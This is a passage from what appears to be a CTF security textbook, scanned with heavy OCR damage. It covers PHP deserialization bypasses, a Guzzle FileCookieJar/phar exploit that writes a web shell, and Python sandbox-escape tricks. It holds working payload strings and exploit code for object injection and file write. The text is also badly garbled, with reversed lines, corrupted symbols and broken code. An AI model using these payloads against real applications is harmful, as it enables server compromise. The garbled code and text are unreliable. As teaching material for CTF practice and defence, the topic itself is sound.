wakeup...";
10
11
unserialize(S_GET['data']);
 C  O ,* | lemon.i/test/serialize/6.php?data=O:4:demo":1:(s:5:demoa";a:0:0]
I am wakeup...I am destruct.
Fig, 3.18 Result
 Iv）{
Exceptien (*So
Fig, 3.20 PHP code
As you can see, “i am wakeup" disappears, proving that wake-up did not trigger.
The most classic real-world example of this trick is the SugarCRM V6.5.23
deserialization vulnerability, in which the deserialization is limited with wakeup.
As you can see from the _wakeup code in Fig. 3.20, it clears all attributes and
throws an error, which also limits the execution of destruct. However, after
deactivating _wakeup by changing the number of attributes, we can use destruct
to write to the file. See Fig. 3.20 for the code for SugarCRM.
---
## Page 223
208
saue qpM pouapV
function sugar_unserialize(Svalue)
preg_match(/[oc]:\d+:/i',$value,Smatches）;
if (count（$matches)）(
return false;
return unserialize(Svalue);
Fig, 3.21 PHP code
2. Bypass the deserialization regular.
See Fig. 3.21 for the code that intercepts these types of deserialized characters when
deserialization is performed using the regular °/[oc]:d+:/i".
O:4 :*deno*:1 : {s:5: "demoa;a:0 : {1}
This is one of the most common forms of reverse sequences, so how do we
bypass it? By analyzing PHP's unserialize( ) function, it is found that the PHP finally
uses php_var_unserialize for parsing, the code is shown in Fig. 3.22.
The above code is mainly parsing the *O':° statement segment, which is jumped
into yy17, and there will also be a “+” judgment. So, if you enter “O:+4:"demo°:1:
{s:5:"demoa²;a:0:())", you can see that when "O':" is followed by °+”, it jumps
from yy17 to yy19, and then proceeds to judge the number following the “+,
meaning that it supports the *+* to express the number,thus bypassing the above
regularity.
3. Deserialized character escape
The trick here is from the vulnerability case Joomla RCE (CVE-2015-8562), a
q pssd od so s ep us ps m so pe 
filter function and is eventually deserialized. So, what problems does this cause? As
we know, when PHP serializes data, if the data to be serialized is a string, it preserves
the length of the string and writes the length to the serialized data. The
deserialization is then read by length, and the underlying PHP implementation is
separated by ":”" and terminated by *)". Properties that do not exist in the class are
also deserialized, and here the escape problem occurs, which leads to object injec-
tion. The following is an example of a demo, the code is shown in Fig. 3.23.
Reading the code, you can see that the correct result here would be “a:2:(i:0;
s:5:"apple";i:1;s:6:*orange":)",. When you change the range in the array to rangex,
the result becomes °a:2: {i:0;s:5:"apple";i:1;s:7:"orangehi'; )", which is one charac-
ter longer than the original length of the serialized data, but actually two characters
---
## Page 224
3.1 Deserialization Vulnerabilities
209
Fig, 3.22 PHP code
case'o':
goto yy13;
yy13:
yych
=*(YYMARKER=++YYCURSOR);
if (yych 
':'）gotoyy17;
goto yy3;
yy17:
yych=*++YYCURSOR;
if （yybm[0+yych]&128）{
goto yy20;
if （yych 
yy19:
yych=*++YYCURSOR;
//判断字符是否为数字
if （yybm[0+yych]&128）{
goto yy20;
goto yy18;
function filter（$string)(
 = 5.5.4)An array of de-sequence processing through serialize 0 function
assasau uopun; O azjeuas au elA + aweu Aax + Japeeup
Fig, 3.25 Session processor
longer, which will definitely lead to a failure during the deserialization. Suppose we
take advantage of the ability of the filter function to change one character into two to
escape the scope of the string, thus injecting the property we want to modify, and we
end up being able to deserialize the property.
pg aq o1 spaou pue z u *,oasues,gs, s peoed  es s,
with 22 x's to escape the length of our payload, see Fig. 3.24.
4. Session deserialization
PHP has several session processors by default: php, php_binary, php_serialize (see
Fig. 3.25 for processing), and wddx (but it requires to install a extension, which is
rare and won’t be explained here). Note that these processors firstly serialized the
data, then store the data to a proper location. When the values are needed, it is
deserialized firstly.
php Processor PHP default processing).
13m0n|s:1 :"a" ;
php_serialize Processor.
a :1 : {s: 5:"13m0n;s:1:*a*;)
When there is a discrepancy between read and save, the processor raises an
exception. As you can see, the stdclass string injected by php_serialize becomes a
stdclass object under php's processing, as compared to Fig. 3.26. *, and then read it
under php processing, it will have “a:2:(s:20:" as the key, followed by
“O:8:°stdClass":0:()” as value Deserialization is performed.
---
## Page 226
3.1  Deserialization Vulnerabilities
211
Fig, 3.26 Compared
php_serialize:save session
RTALm_co_rc(sh) /* (C( */
__AS_ET(r,h);
PS_t90008_1009
bafiz
)else
g9_9sr_serialiae(4hf, strve, wsr_hesh ts8cs_c11
Fig, 3.27 PHP processor when serialization is to °F (vertical) as a boundary
Fig, 3.28 PHP code
just4fun
War Ssecret;
$o
unserialize(s_GET['d']）;
$0
(Sosecret
Soenter)f
The reallife case is the vulnerability found in Joomla 1.5 - 3.4. As you can see, in
the PHP core PHP processor when serialization is to *f' (vertical) as a boundary, as
shown in Fig. 3.27.
However, Joomla has implemented its own session module, which saves as “key
name + vertical line + value deserialized by serialize( function", which causes
problems because it doesn't handle the vertical line boundary properly.
5. PHP References
The challenge exists just4fun class, which has the enter and secret atributes. Since
Ssecret is unknown, how to break the So->secret === So->enter judegement?
The challenge code is shown in Fig. 3.28. As references is exist in PHP, which
represented by “&". “&Sa" represents for references the value of "Sa", that is, the
---
## Page 227
212
souageD qpM poapV
Fig, 3.29 PHP code
just4fun[
$this-> enter=&$this -> secret;
口
echo serialize(new just4fun）);
ze/7.php?d+O:8:"just4fun°:2:(s:5:enter";N;s:6:°secret*;R:2;)
Win
Fig, 3.30 Result
Fig, 3.31 PHP code
$line =trin(fgets(STDIN）);
sflag =fite_get_contents(*/flag′);
classB{
fun
destruct(){
echo sflag:
（unseriatize(stine);
Exception(*well that was unexpected.*);
cho $a;
value of "Sa" in the memory is the address of the pointing variable, and in serialized
strings is R for the reference type. The solution is shown in Fig. 3.29.
At initialization, use “&" to point the enter to the address of the secret and
generate the exploit string.
O : 8 :"just4fun* :2: {s:5 :*enter*;N;s:6: "secret" ;R:2 ; }
You can see that the exploit is *s:6:’secret";R:2", which means the values of the
two attributes are the same value by reference. The result of the solution is shown in
Fig. 3.30.
6. Exception Bypass
Sometimes you may encounter a problem with the thrown problem, because the code
that below cannot be executed because of the exception, see Fig. 3.31.
---
## Page 228
3.1 Deserialization Vulnerabilities
213
In class B,  _destruct outputs the global flag variable and the deserialization
statement is before the throw. Normally, it is reported that the  _destruct will not
execute because an exception is thrown using the throw. But by changing the
attribute to *O:1:"B":1: {1}, the error is parsed, and since the class name is correct,
the _ _destruct of the class name is called, thus executing the _ _destruct before the
throw.
3.1.2Case Studies
The previous described the various techniques in PHP deserialization vulnerabilities, 
then in the actual process of solving the challenge, often appear some real-life
deserialization vulnerabilities, such as  Laravel deserialization, Thinkphp
deserialization and some third-party deserialization problems, here to take a third-
party library Guzzle as an example. There is also a lot of attention on Github for an
arbitrary file write vulnerability in 6.0.0 save ($this- >filenane) ;
, - *
The save( ) function is defined as follows.
public function save ($filename)
$json = [1 ;
foreach (Sthis as Scookie){
if (CookieJar: :shouldPersist (Scookie, Sthis-
>storeSessionCookies))(
$json[] = $cookie->toArray [1 ;
SjsonStx = \GuzzleHttp^.json_encode ($j son) ;
if (false =*= file_put_contents (Stilename, $jsonStr)) (
throv new \RuntimeException [*Unable to save file {Sfilename}) ;
---
## Page 229
214
3 Advanced Web Challenges
It can be found that there is an arbitrary file write flaw in the second if-judgment,
whose name and content we can control; then look at the shouldPersist( ) function in
the first if-judgment.
public static function shouldPersist (SetCookie Scookie,
$allowSessionCookies = false) {
if (Scookie ->getExpirea () 1| Sa1lovSessionCookies) {
if (! Scookie->getDiscard ()) {
return true;
了
return false;
We need to make Scookie->getExpires( ) true and Scookie->getDiscard( ) false or
null. these two functions are defined as follows.
public function getExpires ()
return Sthia->data [ 'Expires′] ;
public funetion getDiscard ()
return Sthis->data ['Diacard′] ;
Next look at Sjson[] = Scookie->toArrayO.
public function toAzray()
return array_map (function (SetCookie Scookie) (
return Scookie- >toArray () ;
}, Sthis->getIterator () ->getArrayCopy ()) ;
The toArray( ) in SetCookie returms all data as follows.
public function toAzray()
return Sthis->data;
So the final exploit is as follows.
?php
:,dqd·protone/xopuan/, - —gIa axpnbox
---
## Page 230
3.2 Security Issues in Python
215
use GuzzleHttp^Cookie\FileCookleJar;
Sobj = nev Fi1eCookieJaz ( /var/www/html/she11 -php*) ;
use GuzzleHttp^Cookie\SetCookie;
Sobj ->setCookie (new SetCookie ([*Name′ => foo',
Spayload = **;
'Value'=> *bar',
Domain' => Spayload,
Excpizes+ => time () 1)) ;
: (xeud xeud,) xeud nau = xeuds
Sphar->setStub (*GIF89a", " *) :
Sphar->startBuffering () ;
Sphar->setMetadata (Sobj) ;
Sphar->addFromString("test,txt", "test") :
Sphar->stopBuffering():
rename (*phar -phar', '1.gif′) ;
Then upload the generated 1.gif to the title server and trigger deserialization using
the Phar protocol.
3.2 Security Issues in Python
Because Python is very easy and fast to implement various functions, it is becoming
more and more popular. At the same time, because Python's features, such as
deserialization and SSTI, are very interesting, the CTF competition has begun to
examine the use of Python's features. This section will introduce the common test
points in the Python challenges of CTF competition, and introduce the ways to
bypass related filters to trigger the vulnerability. Analysis with code or examples to
help readers quickly find and exploit bugs in Python code. Due to differences in
Python 2 and Python 3 parts of functionality, the implementation may differ
somewhat. In the following, unless otherwise noted, there is no difference between
Python 2 and Python 3 in the principle of the relevant vulnerability.
3.2.1SandboxEscape
In CTF, there is a type of challenge that asks the user to submit a piece of code to the
ys-qq snouea any ose  sioado  pue  unu o aaas a pie as
libraries, keywords, etc. in various ways. For these kinds of challenges, we present
the ideas to bypass them one by one, according to the filtering level from low to high.
---
## Page 231
216
3Advanced Web Challenges
3.2.1.1 Keyword Filtering
uass, 1o s, Suuag se pns “ua jo tuog isadus a st Suang piomoy
python is a dynamic language, which is flexible and easy to bypass. For example.
(a)ussso >> 1nport os
(T=) (u+>>> os -_getattribute_ ("ayatem) ("1s")
For strings, we can also add splicing, inverted order, or base64 encoding.
3.2.1.2 The Import
In Python, the most common way to use a specific module is to import it explicitly,
so in many cases import will be filtered as well. However, there are several ways to
import, and you need to try each of them.
>>>> inport os
(so）xodu
>>>> import1ib.import_module ("os")
>>>> 1nport 1mport1ib
Alternatively, if you can control Python code and write a Python file with a
specified name in a specified directory, you might be able to override the module to
be called in the sandbox. For example, when we write random. Py in the current
directory and import random in Python, that's our code. Such as:
>>>> inport random
fake randon
This is the order in which Python imports modules, and the order in which Python
searches modules can also be viewed with sys.path. If we can control this variable,
we can easily override built-in modules. By modifying this path, we can change
Python's search order when importing modules, so that we can bypass the sandbox
by finding code in the path we can control first. Such as:
>> εys - path [-1]
/usr/1ocal/Ce11ar/protobuf/3.5.1_1/1ibexec/1ib/python2.7/ s1te
---
## Page 232
3.2 Security Issues in Python
217
packages'
>> sys -path.append (*/tmp/code")
>> εys -path [-1]
/tmp/code 
In addition to sys.path, sys.modules is another object related to loading modules, 
are sanpou suos j Suuun poes uofd aous pauodu sanpou e Surueuoo
set to None from it, they cannot be imported again. Such as:
{google': , *copy_reg* : >>> sya.nodules
/Teoot/xsn/, uoxg,5axAdoo
1ib/python2 .7/
Ce11ar/python92/2 . 7.15/Frameworks/Python. framework/Versions/2 . 7/
1oca1/Ce1lar/pythona2/
copy_reg·pyc'>, *sre_compile′I cnodule 'sre_compile' from ′/usr/
2 . 7.15/Frameworks/Python. framework/Versions/2 . 7/1ib/python2 . 7/
sre_compile pyc' >.- - }
If you exclude the module from sys.modules, it is completely unusable. However,
it can be observed that the values are all paths, so you can manually put the paths
back in, and then you can make use of them.
>> sys.modules [*os*]
Fython, framework/Versions
>>> sys.nodules [*oa*] = Hone
/2 .7/1ib/python2 .7/os -pyc >
Traceback (most recent cal1 last) :
>>> inport os
File "#, 1ine 1, in 
ImportError: No module named os
Traceback (most recent cal1 last) :
(so)xodu<<<